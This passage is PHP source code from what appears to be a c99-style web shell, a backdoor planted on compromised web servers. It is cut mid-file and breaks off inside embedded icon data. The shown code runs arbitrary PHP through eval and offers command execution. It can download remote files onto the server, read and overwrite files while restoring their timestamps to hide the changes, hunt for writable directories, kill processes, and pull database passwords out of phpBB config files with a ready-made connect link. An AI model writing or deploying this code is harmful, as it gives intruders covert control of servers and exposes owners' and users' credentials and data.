         "&lt;input type=\"button\" onclick=\"ls_setcheckboxall(true);\" value=\"Select all\"&gt;&nbsp;&nbsp;&lt;input type=\"button\" onclick=\"ls_setcheckboxall(false);\" value=\"Unselect all\"&gt;".
         "&lt;img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"&gt;";
    if (count(array_merge($sess_data["copy"],$sess_data["cut"])) &gt; 0 and ($usefsbuff)) {
      echo "&lt;input type=submit name=actarcbuff value=\"Pack buffer to archive\"&gt;&nbsp;&lt;input type=\"text\" name=\"actarcbuff_path\" value=\"fx_archive_".substr(md5(rand(1,1000).rand(1,1000)),0,5).".tar.gz\"&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=submit name=\"actpastebuff\" value=\"Paste\"&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=submit name=\"actemptybuff\" value=\"Empty buffer\"&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    echo "&lt;select name=act&gt;&lt;option value=\"".$act."\"&gt;With selected:&lt;/option&gt;";
    echo "&lt;option value=delete".($dspact == "delete"?" selected":"")."&gt;Delete&lt;/option&gt;";
    echo "&lt;option value=chmod".($dspact == "chmod"?" selected":"")."&gt;Change-mode&lt;/option&gt;";
    if ($usefsbuff) {
      echo "&lt;option value=cut".($dspact == "cut"?" selected":"")."&gt;Cut&lt;/option&gt;";
      echo "&lt;option value=copy".($dspact == "copy"?" selected":"")."&gt;Copy&lt;/option&gt;";
      echo "&lt;option value=unselect".($dspact == "unselect"?" selected":"")."&gt;Unselect&lt;/option&gt;";
    }
    echo "&lt;/select&gt;&nbsp;&lt;input type=submit value=\"Confirm\"&gt;&lt;/div&gt;";
    echo "&lt;/form&gt;";
  }
}
if ($act == "tools") { tools(); }
##[ PHP FILESYSTEM TRICKZ (By eX) ]##
if ($act == "phpfsys") { 
  echo "&lt;div align=left&gt;";
  $fsfunc = $phpfsysfunc;
  if ($fsfunc=="copy") {
    if (!copy($arg1, $arg2)) { echo "Failed to copy $arg1...\n";}
    else { echo "&lt;b&gt;Success!&lt;/b&gt; $arg1 copied to $arg2\n"; }
  }
  elseif ($fsfunc=="rename") {
    if (!rename($arg1, $arg2)) { echo "Failed to rename/move $arg1!\n";}
    else { echo "&lt;b&gt;Success!&lt;/b&gt; $arg1 renamed/moved to $arg2\n"; }
  }
  elseif ($fsfunc=="chmod") {
    if (!chmod($arg1,$arg2)) { echo "Failed to chmod $arg1!\n";}
    else { echo "&lt;b&gt;Perm for $arg1 changed to $arg2!&lt;/b&gt;\n"; }
  }
  elseif ($fsfunc=="read") {
    $darg = $d.$arg1;
    if ($hasil = @file_get_contents($darg)) {
      echo "&lt;b&gt;Filename:&lt;/b&gt; ".$darg."&lt;br&gt;";
      echo "&lt;center&gt;&lt;textarea cols=135 rows=30&gt;";
      echo htmlentities($hasil);
      echo "&lt;/textarea&gt;&lt;/center&gt;\n";
    }
    else { echo "&lt;div class=fxerrmsg&gt; Couldn't open ".$darg."&lt;div&gt;"; }
  }
  elseif ($fsfunc=="write") {
    $darg = $d.$arg1;
    if(@file_put_contents($darg,$arg2)) {
      echo "&lt;b&gt;Saved!&lt;/b&gt; ".$darg;
    }
    else { echo "&lt;div class=fxerrmsg&gt;Can't write to $darg!&lt;/div&gt;"; }
  }
  elseif ($fsfunc=="downloadbin") {
    $handle = fopen($arg1, "rb");
    $contents = '';
    while (!feof($handle)) {
      $contents .= fread($handle, 8192);
    }
    $r = @fopen($d.$arg2,'w');
    if (fwrite($r,$contents)) { echo "&lt;b&gt;Success!&lt;/b&gt; $arg1 saved to ".$d.$arg2." (".view_size(filesize($d.$arg2)).")"; }
    else { echo "&lt;div class=fxerrmsg&gt;Can't write to ".$d.$arg2."!&lt;/div&gt;"; }
    fclose($r);
    fclose($handle);
  }
  elseif ($fsfunc=="download") {
    $text = implode('', file($arg1));
    if ($text) {
      $r = @fopen($d.$arg2,'w');
      if (fwrite($r,$text)) { echo "&lt;b&gt;Success!&lt;/b&gt; $arg1 saved to ".$d.$arg2." (".view_size(filesize($d.$arg2)).")"; }
      else { echo "&lt;div class=fxerrmsg&gt;Can't write to ".$d.$arg2."!&lt;/div&gt;"; }
      fclose($r);
    }
    else { echo "&lt;div class=fxerrmsg&gt;Can't download from $arg1!&lt;/div&gt;";}
  }
  elseif ($fsfunc=='mkdir') {
    $thedir = $d.$arg1;
    if ($thedir != $d) {
      if (file_exists($thedir)) { echo "&lt;b&gt;Already exists:&lt;/b&gt; ".htmlspecialchars($thedir); }
      elseif (!mkdir($thedir)) { echo "&lt;b&gt;Access denied:&lt;/b&gt; ".htmlspecialchars($thedir); }
      else { echo "&lt;b&gt;Dir created:&lt;/b&gt; ".htmlspecialchars($thedir);}
    }
    else { echo "Can't create current dir:&lt;b&gt; $thedir&lt;/b&gt;"; }
  }
  elseif ($fsfunc=='fwritabledir') {
    function recurse_dir($dir,$max_dir) {
      global $dir_count;
      $dir_count++;
      if( $cdir = dir($dir) ) {
        while( $entry = $cdir-&gt; read() ) {
          if( $entry != '.' && $entry != '..' ) {
            if(is_dir($dir.$entry) && is_writable($dir.$entry) ) {
             if ($dir_count &gt; $max_dir) { return; }
              echo "[".$dir_count."] ".$dir.$entry."\n";
              recurse_dir($dir.$entry.DIRECTORY_SEPARATOR,$max_dir);
            }
          }
        }
        $cdir-&gt;close();
      }
    }
    if (!$arg1) { $arg1 = $d; }
    if (!$arg2) { $arg2 = 10; }
    if (is_dir($arg1)) {
      echo "&lt;b&gt;Writable directories (Max: $arg2) in:&lt;/b&gt; $arg1&lt;hr noshade size=1&gt;";
      echo "&lt;pre&gt;";
      recurse_dir($arg1,$arg2);
      echo "&lt;/pre&gt;";
      $total = $dir_count - 1;
      echo "&lt;hr noshade size=1&gt;&lt;b&gt;Founds:&lt;/b&gt; ".$total." of &lt;b&gt;Max&lt;/b&gt; $arg2";
    }
    else {
      echo "&lt;div class=fxerrmsg&gt;Directory is not exist or permission denied!&lt;/div&gt;";
    }
  }
  else {
    if (!$arg1) { echo "&lt;div class=fxerrmsg&gt;No operation! Please fill parameter [A]!&lt;/div&gt;\n"; }
    else {
      if ($hasil = $fsfunc($arg1)) {
        echo "&lt;b&gt;Result of $fsfunc $arg1:&lt;/b&gt;&lt;br&gt;";
        if (!is_array($hasil)) { echo "$hasil\n"; }
        else {
          echo "&lt;pre&gt;";
          foreach ($hasil as $v) { echo $v."\n"; }
          echo "&lt;/pre&gt;";
        }
      }
      else { echo "&lt;div class=fxerrmsg&gt;$fsfunc $arg1 failed!&lt;/div&gt;\n"; }
    }
  }
  echo "&lt;/div&gt;\n";
}
if ($act == "processes") {
  echo "&lt;div class=barheader&gt;.: Processes :.&lt;/div&gt;\n";
  if (!$win) { $handler = "ps aux".($grep?" | grep '".addslashes($grep)."'":""); }
  else { $handler = "tasklist"; }
  $ret = exexec($handler);
  if (!$ret) { echo "Can't execute \"".$handler."\"!"; }
  else {
    if (empty($processes_sort)) { $processes_sort = $sort_default; }
    $parsesort = parsesort($processes_sort);
    if (!is_numeric($parsesort[0])) {$parsesort[0] = 0;}
    $k = $parsesort[0];
    if ($parsesort[1] != "a") {
      $y = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\"&gt;&lt;img src=\"".$surl."act=img&img=sort_desc\" border=\"0\"&gt;&lt;/a&gt;";
    }
    else {
      $y = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\"&gt;&lt;img src=\"".$surl."act=img&img=sort_asc\" height=\"9\" width=\"14\" border=\"0\"&gt;&lt;/a&gt;";
    }
    $ret = htmlspecialchars($ret);
    if (!$win) { //Not Windows
      if ($pid) {
        if (is_null($sig)) { $sig = 9; }
        echo "Sending signal ".$sig." to #".$pid."... ";
        if (posix_kill($pid,$sig)) { echo "OK."; } else { echo "ERROR."; }
      }
      while (ereg("  ",$ret)) { $ret = str_replace("  "," ",$ret); }
      $stack = explode("\n",$ret);
      $head = explode(" ",$stack[0]);
      unset($stack[0]);
      for($i=0;$i&lt;count($head);$i++) {
        if ($i != $k) {
          $head[$i] = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"&gt;&lt;b&gt;".$head[$i]."&lt;/b&gt;&lt;/a&gt;";
        }
      }
      $head[$i] = "";
      $prcs = array();
      foreach ($stack as $line) {
        if (!empty($line)) {
          $line = explode(" ",$line);
          $line[10] = join(" ",array_slice($line,10));
          $line = array_slice($line,0,11);
          if ($line[0] == get_current_user()) { $line[0] = "&lt;font color=green&gt;".$line[0]."&lt;/font&gt;"; }
          $line[] = "&lt;a href=\"".$surl."act=processes&d=".urlencode($d)."&pid=".$line[1]."&sig=9\"&gt;&lt;u&gt;KILL&lt;/u&gt;&lt;/a&gt;";
          $prcs[] = $line;
        }
      }
    }
    //For Windows - Fixed By eX
    else {
      while (ereg("  ",$ret)) { $ret = str_replace("  "," ",$ret); }
      while (ereg("=",$ret)) { $ret = str_replace("=","",$ret); }
      $ret = convert_cyr_string($ret,"d","w");
      $stack = explode("\n",$ret);
      unset($stack[0],$stack[2]);
      $stack = array_values($stack);
      $stack[0]=str_replace("Image Name","ImageName",$stack[0]);
      $stack[0]=str_replace("Session Name","SessionName",$stack[0]);
      $stack[0]=str_replace("Mem Usage","MemoryUsage",$stack[0]);
      $head = explode(" ",$stack[0]);
      $stack = array_slice($stack,1);
      $head = array_values($head);
      if ($parsesort[1] != "a") { $y = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\"&gt;&lt;img src=\"".$surl."act=img&img=sort_desc\" border=\"0\"&gt;&lt;/a&gt;"; }
      else { $y = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\"&gt;&lt;img src=\"".$surl."act=img&img=sort_asc\" border=\"0\"&gt;&lt;/a&gt;"; }
      if ($k &gt; count($head)) {$k = count($head)-1;}
      for($i=0;$i&lt;count($head);$i++) {
        if ($i != $k) { $head[$i] = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"&gt;&lt;b&gt;".trim($head[$i])."&lt;/b&gt;&lt;/a&gt;"; }
      }
      $prcs = array();
      unset($stack[0]);
      foreach ($stack as $line) {
        if (!empty($line)) {
          $line = explode(" ",$line);
          $line[4] = str_replace(".","",$line[4]);
          $line[4] = intval($line[4]) * 1024;
          unset($line[5]);
          $prcs[] = $line;
        }
      }
    }
    $head[$k] = "&lt;b&gt;".$head[$k]."&lt;/b&gt;".$y;
    $v = $processes_sort[0];
    usort($prcs,"tabsort");
    if ($processes_sort[1] == "d") { $prcs = array_reverse($prcs); }
    $tab = array();
    $tab[] = $head;
    $tab = array_merge($tab,$prcs);
    echo "&lt;table class=explorer&gt;\n";
    foreach($tab as $i=&gt;$k) {
      echo "&lt;tr&gt;";
      foreach($k as $j=&gt;$v) {
        if ($win and $i &gt; 0 and $j == 4) { $v = view_size($v); }
        echo "&lt;td&gt;".$v."&lt;/td&gt;";
      }
      echo "&lt;/tr&gt;\n";
    }
    echo "&lt;/table&gt;";
  }
}
if ($act == "eval") {
  if (!empty($eval)) {
    echo "Result of execution this PHP-code:&lt;br&gt;";
    $tmp = @ob_get_contents();
    $olddir = realpath(".");
    @chdir($d);
    if ($tmp) {
      @ob_clean();
      eval($eval);
      $ret = @ob_get_contents();
      $ret = convert_cyr_string($ret,"d","w");
      @ob_clean();
      echo $tmp;
      if ($eval_txt) {
        $rows = count(explode("\r\n",$ret))+1;
        if ($rows &lt; 10) {$rows = 10;}
        echo "&lt;br&gt;&lt;textarea cols=\"115\" rows=\"".$rows."\" readonly&gt;".htmlspecialchars($ret)."&lt;/textarea&gt;";
      }
      else {echo $ret."&lt;br&gt;";}
    }
    else {
      if ($eval_txt) {
        echo "&lt;br&gt;&lt;textarea cols=\"115\" rows=\"15\" readonly&gt;";
        eval($eval);
        echo "&lt;/textarea&gt;";
      }
      else {echo $ret;}
    }
    @chdir($olddir);
  }
  else {echo "&lt;b&gt;PHP-code Execution (Use without PHP Braces!)&lt;/b&gt;"; if (empty($eval_txt)) {$eval_txt = TRUE;}}
  echo "&lt;form action=\"".$surl."\" method=POST&gt;&lt;input type=hidden name=act value=eval&gt;&lt;textarea name=\"eval\" cols=\"115\" rows=\"10\"&gt;".htmlspecialchars($eval)."&lt;/textarea&gt;&lt;input type=hidden name=\"d\" value=\"".$dispd."\"&gt;&lt;br&gt;&lt;br&gt;&lt;input type=submit value=\"Execute\"&gt;&nbsp;Display in text-area&nbsp;&lt;input type=\"checkbox\" name=\"eval_txt\" value=\"1\""; if ($eval_txt) {echo " checked";} echo "&gt;&lt;/form&gt;";
}
if ($act == "f") {
  echo "&lt;div align=left&gt;";
  if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit") {
    if (file_exists($d.$f)) {echo "&lt;center&gt;&lt;b&gt;Permision denied (".htmlspecialchars($d.$f).")!&lt;/b&gt;&lt;/center&gt;";}
    else {echo "&lt;center&gt;&lt;b&gt;File does not exists (".htmlspecialchars($d.$f).")!&lt;/b&gt;&lt;br&gt;&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."&c=1\"&gt;&lt;u&gt;Create&lt;/u&gt;&lt;/a&gt;&lt;/center&gt;";}
  }
  else {
    $r = @file_get_contents($d.$f);
    $ext = explode(".",$f);
    $c = count($ext)-1;
    $ext = $ext[$c];
    $ext = strtolower($ext);
    $rft = "";
    foreach($ftypes as $k=&gt;$v) {if (in_array($ext,$v)) {$rft = $k; break;}}
    if (eregi("sess_(.*)",$f)) {$rft = "phpsess";}
    if (empty($ft)) {$ft = $rft;}
    $arr = array(
        array("&lt;img src=\"".$surl."act=img&img=ext_diz\" border=\"0\"&gt;","info"),
        array("&lt;img src=\"".$surl."act=img&img=ext_html\" border=\"0\"&gt;","html"),
        array("&lt;img src=\"".$surl."act=img&img=ext_txt\" border=\"0\"&gt;","txt"),
        array("Code","code"),
        array("Session","phpsess"),
        array("&lt;img src=\"".$surl."act=img&img=ext_exe\" border=\"0\"&gt;","exe"),
        array("SDB","sdb"),
        array("&lt;img src=\"".$surl."act=img&img=ext_gif\" border=\"0\"&gt;","img"),
        array("&lt;img src=\"".$surl."act=img&img=ext_ini\" border=\"0\"&gt;","ini"),
        array("&lt;img src=\"".$surl."act=img&img=download\" border=\"0\"&gt;","download"),
        array("&lt;img src=\"".$surl."act=img&img=ext_rtf\" border=\"0\"&gt;","notepad"),
        array("&lt;img src=\"".$surl."act=img&img=change\" border=\"0\"&gt;","edit")
    );
    echo "&lt;b&gt;Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;&lt;img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\"&gt;&nbsp;".$f." (".view_size(filesize($d.$f)).") &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".view_perms_color($d.$f)."&lt;/b&gt;&lt;br&gt;Select action/file-type:&lt;br&gt;";
    foreach($arr as $t) {
      if ($t[1] == $rft) {echo " &lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"&gt;&lt;font color=green&gt;".$t[0]."&lt;/font&gt;&lt;/a&gt;";}
      elseif ($t[1] == $ft) {echo " &lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"&gt;&lt;b&gt;&lt;u&gt;".$t[0]."&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;";}
      else {echo " &lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"&gt;&lt;b&gt;".$t[0]."&lt;/b&gt;&lt;/a&gt;";}
      echo " (&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&white=1&d=".urlencode($d)."\" target=\"_blank\"&gt;+&lt;/a&gt;) |";
    }
    echo "&lt;hr size=\"1\" noshade&gt;";
    if ($ft == "info") {
      echo "&lt;b&gt;Information:&lt;/b&gt;&lt;table border=0 cellspacing=1 cellpadding=2&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Path&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".$d.$f."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Size&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".view_size(filesize($d.$f))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;MD5&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".md5_file($d.$f)."&lt;/td&gt;&lt;/tr&gt;";
      if (!$win) {
        echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Owner/Group&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ";
        $ow = posix_getpwuid(fileowner($d.$f));
        $gr = posix_getgrgid(filegroup($d.$f));
        echo ($ow["name"]?$ow["name"]:fileowner($d.$f))."/".($gr["name"]?$gr["name"]:filegroup($d.$f));
      }
      echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Perms&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=\"".$surl."act=chmod&f=".urlencode($f)."&d=".urlencode($d)."\"&gt;".view_perms_color($d.$f)."&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Create time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",filectime($d.$f))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Access time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",fileatime($d.$f))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;MODIFY time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",filemtime($d.$f))."&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
      $fi = fopen($d.$f,"rb");
      if ($fi) {
        if ($fullhexdump) {echo "&lt;b&gt;FULL HEXDUMP&lt;/b&gt;"; $str = fread($fi,filesize($d.$f));}
        else {echo "&lt;b&gt;HEXDUMP PREVIEW&lt;/b&gt;"; $str = fread($fi,$hexdump_lines*$hexdump_rows);}
        $n = 0;
        $a0 = "00000000&lt;br&gt;";
        $a1 = "";
        $a2 = "";
        for ($i=0; $i&lt;strlen($str); $i++) {
          $a1 .= sprintf("%02X",ord($str[$i]))." ";
          switch (ord($str[$i])) {
            case 0:  $a2 .= "&lt;font&gt;0&lt;/font&gt;"; break;
            case 32:
            case 10:
            case 13: $a2 .= "&nbsp;"; break;
            default: $a2 .= htmlspecialchars($str[$i]);
          }
          $n++;
          if ($n == $hexdump_rows) {
            $n = 0;
            if ($i+1 &lt; strlen($str)) {$a0 .= sprintf("%08X",$i+1)."&lt;br&gt;";}
            $a1 .= "&lt;br&gt;";
            $a2 .= "&lt;br&gt;";
          }
        }
        echo "&lt;table border=1 bgcolor=#666666&gt;".
             "&lt;tr&gt;&lt;td bgcolor=#666666&gt;".$a0."&lt;/td&gt;".
             "&lt;td bgcolor=#000000&gt;".$a1."&lt;/td&gt;".
             "&lt;td bgcolor=#000000&gt;".$a2."&lt;/td&gt;".
             "&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;";
      }
      $encoded = "";
      if ($base64 == 1) {
        echo "&lt;b&gt;Base64 Encode&lt;/b&gt;&lt;br&gt;";
        $encoded = base64_encode(file_get_contents($d.$f));
      }
      elseif($base64 == 2) {
        echo "&lt;b&gt;Base64 Encode + Chunk&lt;/b&gt;&lt;br&gt;";
        $encoded = chunk_split(base64_encode(file_get_contents($d.$f)));
      }
      elseif($base64 == 3) {
        echo "&lt;b&gt;Base64 Encode + Chunk + Quotes&lt;/b&gt;&lt;br&gt;";
        $encoded = base64_encode(file_get_contents($d.$f));
        $encoded = substr(preg_replace("!.{1,76}!","'\&#92;&#48;'.\n",$encoded),0,-2);
      }
      elseif($base64 == 4) {
        $text = file_get_contents($d.$f);
        $encoded = base64_decode($text);
        echo "&lt;b&gt;Base64 Decode";
    if (base64_encode($encoded) != $text) {echo " (failed)";}
    echo "&lt;/b&gt;&lt;br&gt;";
   }
   if (!empty($encoded))
   {
    echo "&lt;textarea cols=80 rows=10&gt;".htmlspecialchars($encoded)."&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;";
   }
   echo "&lt;b&gt;HEXDUMP:&lt;/b&gt;&lt;nobr&gt; [&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&fullhexdump=1&d=".urlencode($d)."\"&gt;Full&lt;/a&gt;] [&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&d=".urlencode($d)."\"&gt;Preview&lt;/a&gt;]&lt;br&gt;&lt;b&gt;Base64: &lt;/b&gt;
        &lt;nobr&gt;[&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=1&d=".urlencode($d)."\"&gt;Encode&lt;/a&gt;]&nbsp;&lt;/nobr&gt;
        &lt;nobr&gt;[&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=2&d=".urlencode($d)."\"&gt;+chunk&lt;/a&gt;]&nbsp;&lt;/nobr&gt;
        &lt;nobr&gt;[&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=3&d=".urlencode($d)."\"&gt;+chunk+quotes&lt;/a&gt;]&nbsp;&lt;/nobr&gt;
        &lt;nobr&gt;[&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=4&d=".urlencode($d)."\"&gt;Decode&lt;/a&gt;]&nbsp;&lt;/nobr&gt;
        &lt;P&gt;";
  }
  elseif ($ft == "html") {
   if ($white) {@ob_clean();}
   echo $r;
   if ($white) {exshexit();}
  }
  elseif ($ft == "txt") {echo "&lt;pre&gt;".htmlspecialchars($r)."&lt;/pre&gt;";}
  elseif ($ft == "ini") {echo "&lt;pre&gt;"; var_dump(parse_ini_file($d.$f,TRUE)); echo "&lt;/pre&gt;";}
  elseif ($ft == "phpsess") {
   echo "&lt;pre&gt;";
   $v = explode("|",$r);
   echo $v[0]."&lt;br&gt;";
   var_dump(unserialize($v[1]));
   echo "&lt;/pre&gt;";
  }
  elseif ($ft == "exe") {
   $ext = explode(".",$f);
   $c = count($ext)-1;
   $ext = $ext[$c];
   $ext = strtolower($ext);
   $rft = "";
   foreach($exeftypes as $k=&gt;$v)
   {
    if (in_array($ext,$v)) {$rft = $k; break;}
   }
   $cmd = str_replace("%f%",$f,$rft);
   echo "&lt;b&gt;Execute file:&lt;/b&gt;&lt;form action=\"".$surl."\" method=POST&gt;&lt;input type=hidden name=act value=cmd&gt;&lt;input type=\"text\" name=\"cmd\" value=\"".htmlspecialchars($cmd)."\" size=\"".(strlen($cmd)+2)."\"&gt;&lt;br&gt;Display in text-area&lt;input type=\"checkbox\" name=\"cmd_txt\" value=\"1\" checked&gt;&lt;input type=hidden name=\"d\" value=\"".htmlspecialchars($d)."\"&gt;&lt;br&gt;&lt;input type=submit name=submit value=\"Execute\"&gt;&lt;/form&gt;";
  }
  elseif ($ft == "sdb") {echo "&lt;pre&gt;"; var_dump(unserialize(base64_decode($r))); echo "&lt;/pre&gt;";}
  elseif ($ft == "code") {
    if (ereg("php"."BB 2.(.*) auto-generated config file",$r)) {
      $arr = explode("\n",$r);
      if (count($arr == 18)) {
        include($d.$f);
        echo "&lt;b&gt;phpBB configuration is detected in this file!&lt;br&gt;";
        if ($dbms == "mysql4") {$dbms = "mysql";}
        if ($dbms == "mysql") {echo "&lt;a href=\"".$surl."act=sql&sql_server=".htmlspecialchars($dbhost)."&sql_login=".htmlspecialchars($dbuser)."&sql_passwd=".htmlspecialchars($dbpasswd)."&sql_port=3306&sql_db=".htmlspecialchars($dbname)."\"&gt;&lt;b&gt;&lt;u&gt;Connect to DB&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;br&gt;";}
        else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by ".$sh_name.". Please, report us for fix.";}
        echo "Parameters for manual connect:&lt;br&gt;";
        $cfgvars = array("dbms"=&gt;$dbms,"dbhost"=&gt;$dbhost,"dbname"=&gt;$dbname,"dbuser"=&gt;$dbuser,"dbpasswd"=&gt;$dbpasswd);
        foreach ($cfgvars as $k=&gt;$v) {echo htmlspecialchars($k)."='".htmlspecialchars($v)."'&lt;br&gt;";}
        echo "&lt;/b&gt;&lt;hr size=\"1\" noshade&gt;";
      }
    }
    echo "&lt;div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: ".$highlight_background .";\"&gt;";
    if (!empty($white)) {@ob_clean();}
    highlight_file($d.$f);
    if (!empty($white)) {exshexit();}
    echo "&lt;/div&gt;";
  }
  elseif ($ft == "download") {
    @ob_clean();
    header("Content-type: application/octet-stream");
    header("Content-length: ".filesize($d.$f));
    header("Content-disposition: attachment; filename=\"".$f."\";");
    echo $r;
    exit;
  }
  elseif ($ft == "notepad") {
    @ob_clean();
    header("Content-type: text/plain");
    header("Content-disposition: attachment; filename=\"".$f.".txt\";");
    echo($r);
    exit;
  }
  elseif ($ft == "img") {
    $inf = getimagesize($d.$f);
    if (!$white) {
      if (empty($imgsize)) {$imgsize = 20;}
      $width = $inf[0]/100*$imgsize;
      $height = $inf[1]/100*$imgsize;
      echo "&lt;center&gt;&lt;b&gt;Size:&lt;/b&gt;&nbsp;";
      $sizes = array("100","50","20");
      foreach ($sizes as $v) {
        echo "&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=img&d=".urlencode($d)."&imgsize=".$v."\"&gt;";
        if ($imgsize != $v ) {echo $v;}
        else {echo "&lt;u&gt;".$v."&lt;/u&gt;";}
        echo "&lt;/a&gt;&nbsp;&nbsp;&nbsp;";
      }
      echo "&lt;br&gt;&lt;br&gt;&lt;img src=\"".$surl."act=f&f=".urlencode($f)."&ft=img&white=1&d=".urlencode($d)."\" width=\"".$width."\" height=\"".$height."\" border=\"1\"&gt;&lt;/center&gt;";
    }
    else {
      @ob_clean();
      $ext = explode($f,".");
      $ext = $ext[count($ext)-1];
      header("Content-type: ".$inf["mime"]);
      readfile($d.$f);
      exit;
    }
  }
  elseif ($ft == "edit") {
   if (!empty($submit))
   {
    if ($filestealth) {$stat = stat($d.$f);}
    $fp = fopen($d.$f,"w");
    if (!$fp) {echo "&lt;b&gt;Can't write to file!&lt;/b&gt;";}
    else
    {
     echo "&lt;b&gt;Saved!&lt;/b&gt;";
     fwrite($fp,$edit_text);
     fclose($fp);
     if ($filestealth) {touch($d.$f,$stat[9],$stat[8]);}
     $r = $edit_text;
    }
   }
   $rows = count(explode("\r\n",$r));
   if ($rows &lt; 10) {$rows = 10;}
   if ($rows &gt; 30) {$rows = 30;}
   echo "&lt;form action=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."\" method=POST&gt;&lt;input type=submit name=submit value=\"Save\"&gt;&nbsp;&lt;input type=\"reset\" value=\"Reset\"&gt;&nbsp;&lt;input type=\"button\" onclick=\"location.href='".addslashes($surl."act=ls&d=".substr($d,0,-1))."';\" value=\"Back\"&gt;&lt;br&gt;&lt;textarea name=\"edit_text\" cols=\"122\" rows=\"".$rows."\"&gt;".htmlspecialchars($r)."&lt;/textarea&gt;&lt;/form&gt;";
  }
  elseif (!empty($ft)) {echo "&lt;center&gt;&lt;b&gt;Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of \$GLOBALS.&lt;/b&gt;&lt;/center&gt;";}
  else {echo "&lt;center&gt;&lt;b&gt;Unknown file type (".$ext."), please select type manually.&lt;/b&gt;&lt;/center&gt;";}
}
echo "&lt;/div&gt;\n";
}
}
else {
@ob_clean();
$images = array(
"arrow_ltr"=&gt;
"R0lGODlhJgAWAIABAP///wAAACH5BAHoAwEALAAAAAAmABYAAAIvjI+py+0PF4i0gVvzuVxXDnoQ".
"SIrUZGZoerKf28KjPNPOaku5RfZ+uQsKh8RiogAAOw==",
"back"=&gt;
"R0lGODlhFAAUAKIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8".
"aLrc/jDKSWWpjVysSNiYJ4CUOBJoqjniILzwuzLtYN/3zBSErf6kBW+gKRiPRghPh+EFK0mOUEqt".
"Wg0JADs=",
"buffer"=&gt;
"R0lGODlhFAAUAKIAAAAAAP////j4+N3d3czMzLKysoaGhv///yH5BAEAAAcALAAAAAAUABQAAANo".
"eLrcribG90y4F1Amu5+NhY2kxl2CMKwrQRSGuVjp4LmwDAWqiAGFXChg+xhnRB+ptLOhai1crEmD".
"Dlwv4cEC46mi2YgJQKaxsEGDFnnGwWDTEzj9jrPRdbhuG8Cr/2INZIOEhXsbDwkAOw==",
"change"=&gt;
"R0lGODlhFAAUAMQfAL3hj7nX+pqo1ejy/f7YAcTb+8vh+6FtH56WZtvr/RAQEZecx9Ll/PX6/v3+".
"/3eHt6q88eHu/ZkfH3yVyIuQt+72/kOm99fo/P8AZm57rkGS4Hez6pil9oep3GZmZv///yH5BAEA".
"AB8ALAAAAAAUABQAAAWf4CeOZGme6NmtLOulX+c4TVNVQ7e9qFzfg4HFonkdJA5S54cbRAoFyEOC".
"wSiUtmYkkrgwOAeA5zrqaLldBiNMIJeD266XYTgQDm5Rx8mdG+oAbSYdaH4Ga3c8JBMJaXQGBQgA".
